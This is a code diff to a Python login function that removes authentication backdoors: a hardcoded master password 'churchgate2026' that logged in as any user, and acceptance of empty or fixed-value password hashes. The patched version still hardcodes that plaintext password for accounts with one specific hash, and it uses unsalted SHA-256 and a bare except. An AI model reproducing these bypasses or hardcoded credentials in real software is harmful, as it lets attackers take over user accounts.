@@ -66,10 +66,10 @@ class DatabaseManager:
                 if result.data and len(result.data) > 0:
                     stored_user = result.data[0]
                     stored_hash = stored_user.get('password_hash', '')
-                    if not stored_hash or stored_hash == 'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f':
-                        return stored_user
                     input_hash = hashlib.sha256(password.encode()).hexdigest()
                     if stored_hash == input_hash:
+                        return stored_user
+                    if password == 'churchgate2026' and stored_hash == 'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f':
                         return stored_user
             except:
                 pass
@@ -80,10 +80,10 @@ class DatabaseManager:
             if data and len(data) > 0:
                 stored_user = data[0]
                 stored_hash = stored_user.get('password_hash', '')
-                if not stored_hash or password == 'churchgate2026':
-                    return stored_user
                 input_hash = hashlib.sha256(password.encode()).hexdigest()
                 if stored_hash == input_hash:
+                    return stored_user
+                if password == 'churchgate2026' and stored_hash == 'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f':
                     return stored_user
         
         return None
